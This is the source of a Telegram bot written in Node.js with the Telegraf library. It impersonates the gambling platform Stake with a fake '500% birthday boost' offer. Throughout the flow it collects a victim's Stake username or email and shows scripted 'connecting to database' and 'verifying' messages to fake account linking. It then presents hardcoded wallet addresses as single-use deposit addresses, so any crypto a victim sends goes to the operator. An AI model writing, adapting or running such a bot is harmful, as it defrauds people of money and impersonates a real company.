const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN missing in .env');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const users = {};
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// تعريف خيارات الدفع
const paymentOptions = {
  BTC: {
    type: "multi",
    networks: {
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  ETH: {
    type: "multi",
    networks: {
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  USDT: {
    type: "multi",
    networks: {
      TRC20: "TBJFsdbnVntRGcdk3bkpguyCnd3KdvEafn",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  LTC: { type: "single", address: "LYWFAgqd7k71YckSLtLVQWsozd2Tns9iFw" },
  SOL: { type: "single", address: "ECdHtnUzaJdRVArasUdMebq47gK1gYoCF12yFrvKDxnh" },
  TRX: { type: "single", address: "TBJFsdbnVntRGcdk3bkpguyCnd3KdvEafn" },
  BNB: { type: "single", address: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff" },
  USDC: { type: "single", address: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff" }
};

bot.start((ctx) => {
  ctx.reply(`🎁 Stay updated for the latest exclusive bonuses available for every Stake user.
🚀 Don't miss out - boost your winnings & gaming experience.
✅ Trusted by millions worldwide.`,
    Markup.inlineKeyboard([Markup.button.callback('Check Bonus', 'check_bonus')])
  );
});

bot.action('check_bonus', async (ctx) => {
  await ctx.reply(`🎂 Stake's 8th birthday 500% boost event.
💎 Min-Max Deposit: $100 - $3000
🎰 Wagering Requirement: None
To celebrate our 8th birthday with you, we are rolling out incredible 5x boost on your first top-up.
Feeling lucky - boost now 🚀`,
    Markup.inlineKeyboard([Markup.button.callback('Boost Now', 'boost_now')])
  );
});

bot.action('boost_now', async (ctx) => {
  await ctx.reply(`Step 1﻿: Choose your platform

To activate your boost, we need to know which platform do you play on.
Stake.com
Stake.us`,
    Markup.inlineKeyboard([
      [Markup.button.callback('Stake.com', 'platform_com'), Markup.button.callback('Stake.us', 'platform_us')]
    ])
  );
});

bot.action(/platform_/, async (ctx) => {
  const userId = ctx.from.id;
  users[userId] = { platform: ctx.match[0].split('_')[1] };
  await ctx.reply(`Step 2﻿: Link your Stake account

🌐 ﻿Connect your Stake account to assign the boost.

❗️ ﻿To avoid loss of funds & delays, make sure you entered correct information.

We will never ask for your password & personal info.`,
    Markup.inlineKeyboard([
      [Markup.button.callback('👤 Connect With Username', 'link_username')],
      [Markup.button.callback('📧 Connect With E-mail Address', 'link_email')]
    ])
  );
});

bot.action(['link_username','link_email'], async (ctx) => {
  const userId = ctx.from.id;
  users[userId].linkType = ctx.match[0];
  await ctx.reply(`Step 3﻿: Enter your Stake ${ctx.match[0]==='link_username'?'username':'email'}

🔑﻿ Your account will be linked with Stake bot to activate your boost.

﻿To claim your 500% boost, enter your Stake ${ctx.match[0]==='link_username'?'username':'email'} down below ﻿⬇️`);
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  if(!users[userId] || !users[userId].linkType || users[userId].linked) return;
  users[userId].linkedValue = ctx.message.text;

  await ctx.reply('🔁 Connecting to Stake\'s user database...please wait');
  await sleep(1000);
  await ctx.reply('Fetching server data...');
  await sleep(1000);
  await ctx.reply('Verifying...');
  await sleep(1000);
  await ctx.reply(`﻿ Success!

﻿Your Stake account has been linked successfully.

👤 Stake account: ${ctx.message.text}`);
  await ctx.reply('Continue ➡', Markup.inlineKeyboard([Markup.button.callback('Continue','continue_after_link')]));
  users[userId].linked = true;
});

bot.action('continue_after_link', async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId].linkedValue;

  await ctx.reply('Step 4: Completed!\n\n🎉 Congratulations, your 500% Stake 8th birthday boost is now active!\n\n💵 Deposit any amount between $100 - $3000 and instantly receive 5x your funds - no wager requirements.\n\n(Example: Deposit $300 get $1500 credited to your Stake account)\n\nThis bonus can only be claimed once.');

  await ctx.reply(`💱 Select cryptocurrency you want to deposit.

👤 Linked Stake account: ${account}

This will be connected to your bonus address & used to credit your reward.

🔐 Fast, secure & reliable transactions.`,
    Markup.inlineKeyboard([
      [Markup.button.callback('BTC','currency_BTC'), Markup.button.callback('ETH','currency_ETH')],
      [Markup.button.callback('LTC','currency_LTC'), Markup.button.callback('SOL','currency_SOL')],
      [Markup.button.callback('BNB','currency_BNB'), Markup.button.callback('TRX','currency_TRX')],
      [Markup.button.callback('USDT','currency_USDT'), Markup.button.callback('USDC','currency_USDC')]
    ])
  );
});

// التعامل مع اختيار العملة
bot.action(/currency_(.+)/, async (ctx) => {
  const userId = ctx.from.id;
  const currency = ctx.match[1];
  const option = paymentOptions[currency];

  if (!option) return ctx.reply('⚠️ Invalid currency');

  if (option.type === "multi") {
    await ctx.reply(`🌐 You selected *${currency}*\n\nPlease choose the network:`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: Object.keys(option.networks).map((network) => [
          { text: `${currency} (${network})`, callback_data: `network_${currency}_${network}` }
        ])
      }
    });
  } else {
    await ctx.reply(`Generating single-use ${currency} address associated with your Stake account...`);
    await sleep(3000 + Math.random() * 2000);
    await ctx.reply(`✅ You selected *${currency}*\n\nHere is your deposit address:\n\`${option.address}\``, { parse_mode: "Markdown" });
    await ctx.reply(`🔀 Your deposit will appear on your Stake account ''Transactions'' page once blockchain confirms the transaction.

Avg. waiting time - 3min.
🟢 Click the button below to confirm your deposit.`,
      Markup.inlineKeyboard([Markup.button.callback('Confirm','confirm_deposit')])
    );
  }
});

// التعامل مع اختيار الشبكة
bot.action(/network_([A-Z]+)_([A-Z0-9]+)/, async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId].linkedValue;
  const [, currency, network] = ctx.match;
  const address = paymentOptions[currency].networks[network];

  await ctx.reply(`Generating single-use ${currency} (${network}) address associated with your Stake account...`);
  await sleep(3000 + Math.random() * 2000);
  await ctx.reply(`✅ You selected *${currency}* via *${network}*\n\nHere is your deposit address:\n\`${address}\``, { parse_mode: "Markdown" });
  await ctx.reply(`🔀 Your deposit will appear on your Stake account ''Transactions'' page once blockchain confirms the transaction.

Avg. waiting time - 3min.
🟢 Click the button below to confirm your deposit.`,
    Markup.inlineKeyboard([Markup.button.callback('Confirm','confirm_deposit')])
  );
});

bot.action('confirm_deposit', async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId].linkedValue;
  await ctx.reply(`🎁 Thank you for participating in our Stake bonus event. Hope to see you soon for more upcoming boosts & even bigger wins.

💯 After clicking on ''Complete'' button, your deposit bonus will be credited to your Stake account: ${account} once blockchain records the transaction.`,
    Markup.inlineKeyboard([Markup.button.callback('Complete','complete_bonus')])
  );
});

bot.action('complete_bonus', async (ctx) => {
  await ctx.reply(`What would you like to do?`,
    Markup.inlineKeyboard([
      [Markup.button.callback('CHECK DEPOSIT STATUS','check_status')],
      [Markup.button.callback('CONTACT US','contact_us')],
      [Markup.button.callback('TERMS OF SERVICE','terms')],
      [Markup.button.callback('RESET','reset')]
    ])
  );
});

bot.action('check_status', async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId].linkedValue;
  await ctx.reply('Connecting to gateway...');
  await sleep(5000);
  await ctx.reply(`Checking deposit bonus status for Stake account: ${account}`);
  await sleep(2000);
  await ctx.reply(`No deposit record found for user: ${account}`);
  await ctx.reply(`❌ STATUS: (No deposit record)`);
  await ctx.reply(`Make sure you followed all the steps correctly.`);
});

bot.action('terms', async (ctx) => {
  await ctx.reply(`https://stake.com/policies/terms

Stake (https://stake.com/policies/terms)
Terms of Service - Read T&C's Online at Stake.com
Our terms and conditions include terms of service, important notices, warranties and more. Read all our policies and important information at Stake.com.`);
});

bot.action('reset', async (ctx) => {
  delete users[ctx.from.id];
  await ctx.reply('🔄 Reset completed. Start again with /start');
});

bot.launch();
console.log('✅ Stake Bonus Bot running...');
